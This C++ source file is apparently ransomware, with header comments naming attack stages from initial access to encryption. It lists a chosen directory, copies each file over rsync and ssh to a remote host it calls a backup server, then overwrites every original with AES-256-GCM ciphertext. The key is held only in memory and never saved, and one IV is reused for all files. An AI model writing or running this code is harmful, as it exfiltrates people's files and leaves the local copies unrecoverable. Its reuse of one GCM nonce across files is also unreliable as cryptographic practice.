#include <iostream>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
// initial access 
// Execution
// Privilege access 
// Discovery
// Key management ( private and public key)
// Encryption

namespace fs = std::filesystem;

void Listfiles(const fs::path& directory)
{
  try {
    
    for (const auto& entry : fs::recursive_directory_iterator(
          directory, fs::directory_options::skip_permission_denied
          ))
    {
      if (entry.is_regular_file()) {
        std::cout << entry.path() << '\n'; 
      }
    }
  }
  catch (const fs::filesystem_error& e ){
    std::cerr << "Filesystem error:" << e.what() << '\n';
  }
}

bool runCmd(const char* cmd, char* const argv[])
{
  pid_t pid = fork();
  if (pid == -1) {
    std::cerr << "fork failed\n";
    return false;
  }

  if (pid == 0) {
    execvp(cmd, argv);
    std::cerr << "Failed to run " << cmd << '\n';
    _exit(127);
  }

  int status = 0;
  if (waitpid(pid, &status, 0) == -1)
    return false;

  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

// remote is "user@host:/backup/dir". Must exist before rsync runs.
bool ensureRemoteDir(const std::string& remote)
{
  auto colon = remote.find(':');
  if (colon == std::string::npos)
    return false;

  std::string host = remote.substr(0, colon);
  std::string path = remote.substr(colon + 1);

  char* const argv[] = {
    const_cast<char*>("ssh"),
    const_cast<char*>(host.c_str()),
    const_cast<char*>("mkdir"),
    const_cast<char*>("-p"),
    const_cast<char*>(path.c_str()),
    nullptr
  };

  return runCmd("ssh", argv);
}

// Copies filePath to the server, recreating its path relative to
// rootDir under the remote directory (rsync -R). File is only
// encrypted afterwards if this succeeds.
bool backupFile(
  const fs::path& rootDir,
  const fs::path& filePath,
  const std::string& remote
) {
  std::string rel = fs::relative(filePath, rootDir).generic_string();
  std::string src = rootDir.generic_string() + "/./" + rel;
  std::string dst = remote + "/";

  char* const argv[] = {
    const_cast<char*>("rsync"),
    const_cast<char*>("-azR"),
    const_cast<char*>("-e"),
    const_cast<char*>("ssh"),
    const_cast<char*>(src.c_str()),
    const_cast<char*>(dst.c_str()),
    nullptr
  };

  return runCmd("rsync", argv);
}

bool GenerateAESKey(unsigned char* aes_key)
{
  if (RAND_bytes(aes_key, 32) != 1) {
    std::cerr << "Failed to generate AES key\n";
    return false;
  }
  return true;
}

bool encryptAES(
  const unsigned char* plaintext,
  int plaintext_len,
  const unsigned char* key,
  const unsigned char* iv,
  std::vector<unsigned char>& ciphertext,
  unsigned char* tag
) {
  EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

  if (!ctx)
    return false;

  int len;
  int ciphertext_len;

  // Select AES-256-GCM
  EVP_EncryptInit_ex(
    ctx,
    EVP_aes_256_gcm(),
    nullptr,
    nullptr,
    nullptr
  );

  // Give AES the generated key and IV
  EVP_EncryptInit_ex(
    ctx,
    nullptr,
    nullptr,
    key,
    iv
  );

  ciphertext.resize(plaintext_len + EVP_MAX_BLOCK_LENGTH);

  // Encrypt the plaintext
  EVP_EncryptUpdate(
    ctx,
    ciphertext.data(),
    &len,
    plaintext,
    plaintext_len
  );

  ciphertext_len = len;

  // Finish encryption
  EVP_EncryptFinal_ex(
    ctx,
    ciphertext.data() + len,
    &len
  );

  ciphertext_len += len;
  ciphertext.resize(ciphertext_len);

  // Get authentication tag
  EVP_CIPHER_CTX_ctrl(
    ctx,
    EVP_CTRL_GCM_GET_TAG,
    16,
    tag
  );

  EVP_CIPHER_CTX_free(ctx);

  return true;
}

bool encryptFile(
  const fs::path& filePath,
  const unsigned char* key,
  const unsigned char* iv,
  unsigned char* tag
) {
  std::ifstream inFile(filePath, std::ios::binary);
  if (!inFile) {
    std::cerr << "Failed to open file: " << filePath << '\n';
    return false;
  }

  std::vector<unsigned char> plaintext(
    (std::istreambuf_iterator<char>(inFile)),
    std::istreambuf_iterator<char>()
  );
  inFile.close();

  std::vector<unsigned char> ciphertext;
  if (!encryptAES(plaintext.data(), plaintext.size(), key, iv, ciphertext, tag)) {
    std::cerr << "Encryption failed for: " << filePath << '\n';
    return false;
  }

  std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
  if (!outFile) {
    std::cerr << "Failed to write file: " << filePath << '\n';
    return false;
  }

  outFile.write(
    reinterpret_cast<const char*>(ciphertext.data()),
    ciphertext.size()
  );

  return true;
}

int main(){
  std::string directory;
  std::cout << "Directory to inspect: ";
  std::getline(std::cin, directory);

  if (!fs::exists(directory) || !fs::is_directory(directory)){
    std::cerr << "Invalide directory \n";
    return 1;
  }

  std::string server;
  std::cout << "Backup server (user@host): ";
  std::getline(std::cin, server);

  std::string remoteDir;
  std::cout << "Remote backup directory: ";
  std::getline(std::cin, remoteDir);

  std::string remote = server + ":" + remoteDir;
  Listfiles(directory);

  if (!ensureRemoteDir(remote)) {
    std::cerr << "Failed to reach server or create remote directory\n";
    return 1;
  }

  // 256-bit AES key = 32 bytes
  unsigned char aes_key[32];

  // GCM nonce/IV = 12 bytes
  unsigned char iv[12];

  // Authentication tag = 16 bytes
  unsigned char tag[16];

  if (!GenerateAESKey(aes_key)) {
    return 1;
  }

  if (RAND_bytes(iv, sizeof(iv)) != 1) {
    std::cerr << "Failed to generate IV\n";
    return 1;
  }

  try {
    for (const auto& entry : fs::recursive_directory_iterator(
          directory, fs::directory_options::skip_permission_denied
          ))
    {
      if (entry.is_regular_file()) {
        if (!backupFile(fs::path(directory), entry.path(), remote)) {
          std::cerr << "Backup failed, skipping: " << entry.path() << '\n';
          continue;
        }
        if (encryptFile(entry.path(), aes_key, iv, tag)) {
          std::cout << "Encrypted: " << entry.path() << '\n';
        }
      }
    }
  }
  catch (const fs::filesystem_error& e) {
    std::cerr << "Filesystem error:" << e.what() << '\n';
  }

  return 0;
}
